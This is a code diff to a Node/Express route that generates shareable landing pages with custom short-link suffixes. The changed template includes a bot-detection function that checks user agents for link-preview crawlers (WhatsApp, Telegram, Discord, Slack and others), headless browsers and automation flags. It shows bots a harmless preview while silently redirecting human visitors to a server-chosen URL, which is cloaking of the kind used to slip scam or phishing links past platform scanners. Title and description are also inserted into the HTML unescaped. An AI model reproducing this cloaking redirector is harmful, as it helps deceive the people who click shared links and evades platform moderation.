@@ -61,19 +61,19 @@ router.post('/api/generate-landing', authenticateToken, authMiddleware, upload.s
         if (customSuffix) {
             // Check if suffix contains only alphanumeric characters and hyphens, and is between 4-20 characters
             if (!/^[a-zA-Z0-9-]{4,20}$/.test(customSuffix)) {
-                return res.status(400).json({ 
-                    message: 'Suffix phải chứa từ 4-20 ký tự chữ, số và dấu gạch ngang (-)!' 
+                return res.status(400).json({
+                    message: 'Suffix phải chứa từ 4-20 ký tự chữ, số và dấu gạch ngang (-)!'
                 });
             }
-            
+
             // Check if suffix is already used
             const existingLink = await Link.findOne({ url: { $regex: customSuffix } });
             if (existingLink) {
-                return res.status(400).json({ 
-                    message: 'Suffix này đã được sử dụng! Vui lòng chọn suffix khác.' 
+                return res.status(400).json({
+                    message: 'Suffix này đã được sử dụng! Vui lòng chọn suffix khác.'
                 });
             }
-            
+
             landingId = customSuffix;
         } else {
             landingId = generateShortId();
@@ -94,23 +94,59 @@ router.post('/api/generate-landing', authenticateToken, authMiddleware, upload.s
 
         // Create the HTML content with correct image path
         const htmlContent = `
-    <!DOCTYPE html>
-    <html lang="vi">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>${title}</title>
-        <meta name="description" content="${description}">
-        <meta property="og:title" content="${title}">
-        <meta property="og:description" content="${description}">
-        <meta property="og:image" content="${domain}/build/${landingId}/${imageFileName}">
-        <meta property="og:image:type" content="image/${imageExtension.slice(1)}">
-        <meta name="twitter:card" content="summary_large_image">
-        <meta name="twitter:title" content="${title}">
-        <meta name="twitter:description" content="${description}">
-        <meta name="twitter:image" content="./${landingId}/${imageFileName}">
-        <script>
-            async function trackVisit() {
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>${title}</title>
+    <meta name="description" content="${description}">
+    <meta property="og:title" content="${title}">
+    <meta property="og:description" content="${description}">
+    <meta property="og:image" content="${domain}/build/${landingId}/${imageFileName}">
+    <meta property="og:image:type" content="image/${imageExtension.slice(1)}">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="${title}">
+    <meta name="twitter:description" content="${description}">
+    <meta name="twitter:image" content="${domain}/build/${landingId}/${imageFileName}">
+</head>
+<body>
+    <div id="content">
+        <h1>${title}</h1>
+        <img src="${domain}/build/${landingId}/${imageFileName}" alt="${title}" width="100%">
+        <p>${description}</p>
+    </div>
+
+    <script>
+        function detectBot() {
+            const botPatterns = [
+                'bot', 'spider', 'slurp','whatsapp',
+                'telegram', 'viber', 'twitter', 'discord', 'slack',
+                'linkedin', 'skype', 'pinterest', 'zoom'
+            ];
+
+            const userAgent = navigator.userAgent.toLowerCase();
+
+            if (botPatterns.some(pattern => userAgent.includes(pattern))) return true;
+            if (navigator.webdriver || window.navigator.webdriver) return true;
+
+            const automationTools = [
+                '_phantom','__nightmare','callPhantom','buffer',
+                'awesomium','cef','selenium','headless',
+                'phantomjs','nightmarejs','rhino'
+            ];
+
+            for (const tool of automationTools) {
+                if (window[tool]) return true;
+            }
+
+            if (navigator.plugins.length === 0) return true;
+
+            return false;
+        }
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            if (!detectBot()) {
                 try {
                     const response = await fetch('/api/visits/${landingId}', {
                         method: 'POST',
@@ -120,76 +156,22 @@ router.post('/api/generate-landing', authenticateToken, authMiddleware, upload.s
                     });
                     const data = await response.json();
                     if (data.redirectUrl) {
-                        window.location.replace(data.redirectUrl);
+                        setTimeout(() => {
+                            window.location.replace(data.redirectUrl);
+                        }, 300);
                     }
                 } catch (error) {
                     console.error('Error tracking visit:', error);
-                    window.location.replace("${redirectUrl}");
+                    setTimeout(() => {
+                        window.location.replace("${redirectUrl}");
+                    }, 300);
                 }
             }
-
-            function detectBot() {
-                const botPatterns = [
-                    'bot', 'spider', 'slurp','whatsapp',
-                    'telegram', 'viber', 'twitter', 'discord', 'slack',
-                    'linkedin', 'skype', 'pinterest', 'zoom'
-                ];
-
-                const userAgent = navigator.userAgent.toLowerCase();
-
-                if (botPatterns.some(pattern => userAgent.includes(pattern))) {
-                    return true;
-                }
-
-                if (navigator.webdriver || window.navigator.webdriver) {
-                    return true;
-                }
-
-                const automationTools = [
-                    '_phantom',
-                    '__nightmare',
-                    'callPhantom',
-                    'buffer',
-                    'awesomium',
-                    'cef',
-                    'selenium',
-                    'headless',
-                    'phantomjs',
-                    'nightmarejs',
-                    'rhino'
-                ];
-
-                for (const tool of automationTools) {
-                    if (window[tool]) {
-                        return true;
-                    }
-                }
-
-                if (navigator.plugins.length === 0) {
-                    return true;
-                }
-
-                return false;
-            }
-
-            window.onload = function() {
-                if (!detectBot()) {
-                    trackVisit();
-                } else {
-                    document.getElementById('content').style.display = 'block';
-                }
-            };
-        </script>
-    </head>
-    <body>
-        <div id="content" style="display: none">
-            <h1>${title}</h1>
-            <img src="./${landingId}/${imageFileName}" alt="${title}" width="100%">
-            <p>${description}</p>
-        </div>
-    </body>
-    </html>
-        `;
+        });
+    </script>
+</body>
+</html>
+`;
 
         // Save the HTML file
         const htmlFilePath = path.join(landingDir, 'index.html');
